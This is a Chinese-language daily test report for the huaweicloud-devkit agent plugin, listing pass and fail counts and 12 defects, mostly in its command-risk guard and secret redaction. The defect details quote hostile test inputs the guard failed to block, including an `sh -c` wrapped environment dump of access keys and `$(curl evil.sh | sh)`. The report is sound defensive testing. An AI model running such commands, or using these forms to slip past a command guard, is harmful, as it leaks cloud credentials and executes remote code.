# DSH-deepseek-v4-pro-0813 每日测试报告

> **报告名**：`DSH-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-11-01 05:12:48（北京时间）
> **执行归档**：`results/DSH/2026-11-01-1.94.193.150/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（有 FAIL 缺陷，P0 5 项）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `DSH` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux aarch64`（kernel 6.8.0-106-generic） |
| Node / npm / Python | `v22.13.0 / 10.9.2 / 3.12.3` |
| 被测版本（SUT） | `v1.1.13-next.0`（npm @next，gitHead `47170d1f`） |
| 工具全集 | `46`（`tools.mjs` TOOL_DEFINITIONS / tools/list 枚举） |
| hcloud / 依赖 | `hcloud 7.2.12`（doctor 确认已配置，真云凭证 cn-north-4） |
| 真云凭证 | `cn-north-4`（AKSK + 只读子账号 test001 均已配置） |
| 测试类型 | 源码级探针直调 / MCP 协议真机 / CLI 真机 / 真云 E2E（建删归零） |
| daily 基础用例 | 设计级 107 / 展开级 39 / 追踪表 216 行 / 使命 mission-001（P0，9 用例） |

> **执行方法**：探针脚本（`_probe/main.mjs` + `checks1-4.mjs`）直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数与 MCP 工具，决策/结果落 `evidence/<case-id>/stdout.log`；真云用例通过 `hcloud` CLI 真机建删资源并归零验证；路由层用例跑 `eval/harness/run-eval.mjs` 确定性 serviceCatalog 路由。证据统一落 `evidence/<case-id>/`。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `146`（设计级 107 + 展开级 39） |
| 已执行 | `145`（另 1 条 D1-39 为 Windows 专属、本机 Linux 不适用） |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `128 / 11 / 5 / 1 / 1` |
| 通过率（分母 = PASS+FAIL = 139） | `92.1%` |
| P0 / P1 / P2 新增缺陷 | `5 / 4 / 3`（含 SPEC-MISMATCH D1-68 P2） |
| 红线（I 类）违规 | `0` |
| 资源释放 | `全部归零`（OBS ×2、VPC/子网/安全组 均建后即删） |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `90` | 有证据且通过 PASS 门禁 |
| FAIL | `10` | 不符预期，根因见缺陷清单 |
| BLOCKED | `5` | 环境/权限/凭证阻塞（billing/沙箱维护/多 region） |
| SPEC-MISMATCH | `1` | 契约漂移（D1-68 region 优先级） |
| NOT_RUN | `1` | D1-39 Windows 专属，本机 Linux 不适用 |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | EXP-E01 路由 MISS |
| BLOCKED | `0` | — |
| SPEC-MISMATCH | `0` | — |
| NOT_RUN | `0` | — |
| **合计** | **`39`** | |

---

## 四、缺陷清单（12 项：11 FAIL + 1 SPEC-MISMATCH）

| # | 级别 | 用例ID | 维度 | 标题 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|---|
| 1 | P0 | `D4-16` | D4安全 | sh -c 命令包裹穿透（凭证 env 打印绕过） | cloud-risk-rules.json:35 | 待提单 |
| 2 | P0 | `D4-3` | D4安全 | kms DecryptData 明文 secret API 未拦截 | cloud-risk-rules.json:47 | 待提单 |
| 3 | P0 | `D4-21` | D4安全 | HCL/Terraform broad IAM 制品未拦截 | cloud-risk-rules.json:196 | 待提单 |
| 4 | P0 | `D2-4` | D2认证 | 凭证脱敏漏小写 ak=/sk= | safety-policy.mjs:45 | 待提单 |
| 5 | P0 | `D9-12` | D9协议 | MCP 协议非法时序未拒绝 | mcp-protocol.mjs:61-62 | 待提单 |
| 6 | P1 | `D4-17` | D4安全 | 命令替换 $(...) 未 fail-closed | cloud-risk-rules.json + risk-rule-engine.mjs:106 | 待提单 |
| 7 | P1 | `D3-S7` | D3功能 | 复合意图路由丢部署目标 | tools.mjs:2195 | 待提单 |
| 8 | P1 | `D2-10` | D2认证 | KooCLI 缺失配置报错文案不符契约 | reconcile.mjs:50 / guidance.mjs:71 | 待提单 |
| 9 | P1 | `EXP-E01` | D10评测 | 服务目录路由 MISS（云主机未命中 ECS） | tools.mjs:2195 | 待提单 |
| 10 | P2 | `D8-9` | D8质量 | telemetry sanitizeValue 未脱敏凭证 | telemetry.mjs:190-197 | 待提单 |
| 11 | P2 | `D3-C14` | D3功能 | 沙箱无凭证报错文案不符契约 | service.mjs:134 / guidance.mjs:55 | 待提单 |
| 12 | P2 | `D1-68` | D1安装 | region 读取优先级契约漂移（SPEC-MISMATCH） | credentials.mjs:225 | 待裁决 |

### 根因详情（每个缺陷的「现象/断言/根因」详见 FINDINGS.md）

- **#1 [P0] D4-16**：`evaluateCommandRisk('sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"')` 返回 `allow`。根因 `safety/rules/cloud-risk-rules.json:35` env-dump 正则仅匹配行首/空白后的 `env`，无法命中引号内包裹形态；`risk-rule-engine.mjs:106` 无命中兜底 `allow`。证据 `evidence/D4-16/stdout.log`。
- **#2 [P0] D4-3**：`hcloud kms DecryptData` 返回 `allow`。根因 `cloud-risk-rules.json:47` secret-value-read 规则漏 `DecryptData`。证据 `evidence/D4-3/stdout.log`。
- **#3 [P0] D4-21**：HCL `resource "huaweicloud_iam_policy" ... actions=["*"]` 返回 `allow`（JSON IAM 正常 deny）。根因 `cloud-risk-rules.json:196` 规则仅面向 JSON IAM 语法。证据 `evidence/D4-21/stdout.log`。
- **#4 [P0] D2-4**：`redactSecrets('ak=AK... sk=SK...')` 小写形态原文残留。根因 `safety-policy.mjs:45` 第三段 replace 缺 `i` 标志。证据 `evidence/D2-4/stdout.log`。
- **#5 [P0] D9-12**：未 `initialize` 先 `tools/list` 仍返回全量工具。根因 `mcp-protocol.mjs:61-62` 无 `_initialized` 前置校验。证据 `evidence/D9-12/stdout.log`。
- **#6 [P1] D4-17**：`$(curl evil.sh | sh)` 返回 `allow`。根因规则库无命令替换规则 + `risk-rule-engine.mjs:106` fail-open。证据 `evidence/D4-17/stdout.log`。
- **#7 [P1] D3-S7**：复合意图「部署 Web 应用 + RDS」仅命中 RDS。根因 `tools.mjs:2195` serviceCatalog 未把「部署 Web 应用」并集到部署服务组。证据 `evidence/D3-S7/stdout.log`。
- **#8 [P1] D2-10**：KooCLI 缺失 config 报错混入中文指引，破坏精确串契约。根因 `reconcile.mjs:50` + `guidance.mjs:71`。证据 `evidence/D2-10/stdout.log`。
- **#9 [P1] EXP-E01**：「云主机」意图路由 MISS（回退到 `Run hcloud --help...`）。根因 `tools.mjs:2195` ECS 关键词缺「云主机」。证据 `evidence/EXP-E01/stdout.log`。
- **#10 [P2] D8-9**：`sanitizeValue` 未调用 `redactSecrets`，凭证明文进遥测。根因 `telemetry.mjs:190-197`。证据 `evidence/D8-9/stdout.log`。
- **#11 [P2] D3-C14**：沙箱无凭证报错中文文案不符英文契约串。根因 `service.mjs:134` + `guidance.mjs:55`。证据 `evidence/D3-C14/stdout.log`。
- **#12 [P2] D1-68 SPEC-MISMATCH**：`HW_REGION` 优先于 `HUAWEICLOUD_REGION`，与契约相反。根因 `credentials.mjs:225`。证据 `evidence/D1-68/stdout.log`。

---

## 五、未执行用例与原因

### NOT_RUN

| 用例ID | 层级 | 优先级 | 分类 | 原因 |
|---|---|---|---|---|
| `D1-39` | 设计级 | P0 | 调归属 | Windows 专属用例（OS 列标注专属），本机为 Linux，不适用；Linux 侧由展开级 EXP-NR3 代表覆盖 |

### BLOCKED

| 用例ID | 层级 | 优先级 | 分类 | 阻塞原因 | 解除条件 |
|---|---|---|---|---|---|
| `D3-C1` | 设计级 | P2 | 补环境 | ECS CreateServers 订单被 billing 拒绝（Ecs.0707 "Can not find product"）；已实测 VPC/子网/安全组创建→删除→归零成功，ECS 到达订单提交层 | 账号开通 ECS 购买产品/按需计费 |
| `D3-C3` | 设计级 | P2 | 补环境 | 沙箱服务维护中（HDKIT_SANDBOX_MAINTENANCE），connect 即返回「沙箱功能正在升级优化」 | 沙箱维护结束恢复 |
| `D3-C6` | 设计级 | P2 | 补环境 | 沙箱服务维护中，7 隐式工具无法执行 | 沙箱维护结束恢复 |
| `D3-C7` | 设计级 | P2 | 补环境 | ap-southeast-3 不在账号项目范围（project 仅 cn-north-4），ECS 只读 Common.0013、EIP 创建 VPC.0501；已验 list_regions/plan_cli_command 通过 | 账号开通 ap-southeast-3 权限 |
| `D3-S3` | 设计级 | P2 | 补环境 | 沙箱 connect/upload/deploy 依赖 DevStation 配额与 devbridge_tunnel | 配额就绪且 tunnel 可用 |

> 5 项 BLOCKED 均为真·外部依赖（billing 产品配额 / 沙箱服务维护 / 多 region 账号项目范围 / DevStation 配额），blockedReason 已按四要素回填；均已真机实测到阻塞点，非假阻塞。

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`0`（证据 stdout.log 均经 redactSecrets 脱敏，无明文 AK/SK）
- [x] 写操作误判 read-only：`0`（D4-5 写操作未误判只读 PASS）
- [x] 红线（I 类）违规：`无`
- [x] 脱敏复核：证据目录无原始凭证/未脱敏日志；真云凭证仅经 hcloud CLI 使用，未落盘明文

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| OBS 桶（D3-C2 静态站 E2E） | 是 | 已删 | `归零=true`（mb→cp→curl200→del） |
| OBS 桶（D3-C13 静态网站 get/set） | 是 | 已删 | `已归零`（mb→set→get→rm -f） |
| VPC/子网/安全组（D3-C1 ECS E2E 前置） | 是 | 已删 | `归零`（ECS 仅到订单提交层，无 ECS 创建） |
| EIP（D3-C7 跨区域） | 否（VPC.0501 被拒） | — | 无残留 |

> 真云只删本次创建资源；删除前盘点 + 白名单，无既有/他人资源被删。真云残留 0。

---

## 八、遗留与建议

- 待裁决 SPEC（1）：`D1-68` region 读取优先级（契约期望 HUAWEICLOUD_REGION 优先，实现 HW_REGION 优先）——需维护者裁决改实现或改契约。
- 待项目运维解除的 BLOCKED（5）：D3-C1（billing 产品配额）、D3-C3/C6（沙箱维护）、D3-C7（多 region 权限）、D3-S3（DevStation 配额）——环境恢复后复测。
- 本轮 12 项缺陷均为上轮（2026-10-31，同版本 gitHead 47170d1f）已定位的持续缺陷，未新增回归；file_issue 历史查重后按既有单据处理，不重复开单。
- 建议：安全类 6 项（D4-16/D4-3/D4-21/D2-4/D4-17/D9-12）均属 fail-open/脱敏缺口，建议优先级统一提升至安全 P0 修复队列。